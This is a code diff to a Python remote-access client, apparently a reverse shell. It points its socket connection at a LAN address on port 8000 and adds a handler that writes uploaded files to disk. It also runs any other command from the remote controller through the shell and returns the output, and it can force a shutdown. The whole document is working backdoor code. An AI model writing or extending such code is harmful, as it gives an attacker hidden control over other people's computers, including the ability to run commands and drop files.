@@ -8,9 +8,10 @@ import shutil
 import sys
 
 s = socket.socket()
+
 while True:
     try:
-        HOST = "127.0.0.1"
+        HOST = "192.168.41.183"
         PORT = 8000
 
         s.connect((HOST, PORT))
@@ -58,6 +59,10 @@ if __name__ =="__main__":
                 print("Connection Disconnecting")
                 break
 
+            elif cmd ==  'code .':
+                s.send("task completed".encode())
+                os.system("code .")
+
             elif cmd == "shutdown":
                 os.system("shutdown -s -f -t 0")
 
@@ -87,9 +92,32 @@ if __name__ =="__main__":
                     s.send("alert showed".encode())   # 🔥 add this
                 except:
                     s.send("alert not showed".encode())
+
             
+                
+            elif cmd.startswith("upload "):
+                try:
+                    
+                    filename = s.recv(1024).decode()
+                    filesize = int(s.recv(1024).decode())
+
+                    data = b""
+                    while len(data) < filesize:
+                        packet = s.recv(4096)
+                        if not packet:
+                            break
+                        data += packet
+
+                    with open(filename, "wb") as f:
+                        f.write(data)
+
+                    s.send("File Uploaded Successfully".encode())
+
+                except Exception as e:
+                    s.send(str(e).encode())
             else:
                 try:
+                    s.send("Task Completed".encode())
                     syscmd = subprocess.check_output(cmd, shell=True)
 
                     sysmsg = syscmd.decode()
